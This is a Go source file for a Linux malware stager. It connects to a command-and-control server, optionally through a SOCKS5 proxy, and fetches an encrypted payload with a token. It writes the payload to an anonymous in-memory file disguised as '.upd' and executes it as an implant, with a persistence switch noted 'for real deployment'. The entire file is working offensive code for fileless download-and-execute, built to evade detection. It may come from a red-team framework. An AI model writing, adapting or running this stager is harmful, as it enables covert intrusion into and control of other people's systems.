//go:build linux

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/net/proxy"
)

// Overridden at build time via -ldflags -X
var (
	serverAddr    = "localhost:8443"
	authToken     = "stag3r-t0k3n"
	implantToken  = ""   // if empty, uses authToken
	aesKeyHex     = ""   // 32-byte hex key for AES-256-GCM; empty = no encryption
	noPersist     = "true"  // pass --no-persist; set "false" for real deployment
	proxyAddr     = ""   // SOCKS5 proxy (e.g., socks5://127.0.0.1:9050)
)

func main() {
	// 1. Connect to C2 server (optionally through SOCKS5 proxy)
	var conn net.Conn
	var err error

	if proxyAddr != "" {
		proxyURL, parseErr := url.Parse(proxyAddr)
		if parseErr == nil {
			dialer, dialErr := proxy.FromURL(proxyURL, proxy.Direct)
			if dialErr == nil {
				conn, err = dialer.Dial("tcp", serverAddr)
			}
		}
		if err != nil {
			os.Exit(1)
		}
	} else {
		conn, err = net.DialTimeout("tcp", serverAddr, 15*time.Second)
		if err != nil {
			os.Exit(1)
		}
	}
	defer conn.Close()

	// 2. Request payload
	req := fmt.Sprintf("GET /api/v1/stage/payload HTTP/1.0\r\nHost: c2\r\nX-Stager-Token: %s\r\nConnection: close\r\n\r\n", authToken)
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	if _, err := conn.Write([]byte(req)); err != nil {
		os.Exit(2)
	}

	// 3. Read full response
	resp := slurp(conn)
	if len(resp) == 0 {
		os.Exit(3)
	}

	// 4. Parse HTTP — find \r\n\r\n separating headers from body
	headerEnd := strings.Index(string(resp), "\r\n\r\n")
	if headerEnd < 0 {
		os.Exit(4)
	}
	body := resp[headerEnd+4:]

	// Check for HTTP error
	statusLine := string(resp[:strings.Index(string(resp), "\r\n")])
	if !strings.Contains(statusLine, "200") {
		os.Exit(5)
	}

	if len(body) < 1000 {
		os.Exit(6)
	}

	// 5. Decrypt if key is set
	if aesKeyHex != "" {
		var err error
		body, err = decrypt(body, aesKeyHex)
		if err != nil {
			os.Exit(7)
		}
	}

	// 6. Create anonymous memory fd, write payload, execute
	fd, err := memfdCreate(".upd")
	if err != nil {
		os.Exit(8)
	}

	if _, err := syscall.Write(fd, body); err != nil {
		os.Exit(9)
	}
	if _, err := syscall.Seek(fd, 0, 0); err != nil {
		os.Exit(10)
	}

	// Replace current process with the implant from memory
	token := implantToken
	if token == "" {
		token = authToken
	}
	args := []string{
		os.Args[0],
		"--token", token,
		"--server", "http://" + serverAddr,
	}
	if noPersist == "true" {
		args = append(args, "--no-persist")
	}
	if proxyAddr != "" {
		args = append(args, "--proxy", proxyAddr)
	}
	syscall.Exec("/proc/self/fd/"+strconv.Itoa(fd), args, os.Environ())
	os.Exit(11)
}

func slurp(conn net.Conn) []byte {
	var out []byte
	buf := make([]byte, 65536)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			out = append(out, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	return out
}

func memfdCreate(name string) (int, error) {
	b, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0, err
	}
	// memfd_create = 319 on x86_64, 385 on aarch64
	const memfdCreate = 319
	fd, _, errno := syscall.Syscall(memfdCreate, uintptr(unsafe.Pointer(b)), 0, 0)
	if errno != 0 {
		return 0, errno
	}
	return int(fd), nil
}

func decrypt(data []byte, keyHex string) ([]byte, error) {
	key := make([]byte, 32)
	if n, err := fmt.Sscanf(keyHex, "%64x", &key); n != 1 || err != nil {
		return nil, fmt.Errorf("bad key")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	if len(data) < 12 {
		return nil, fmt.Errorf("data too short")
	}
	nonce := data[:12]
	ciphertext := data[12:]

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	return aesgcm.Open(nil, nonce, ciphertext, nil)
}
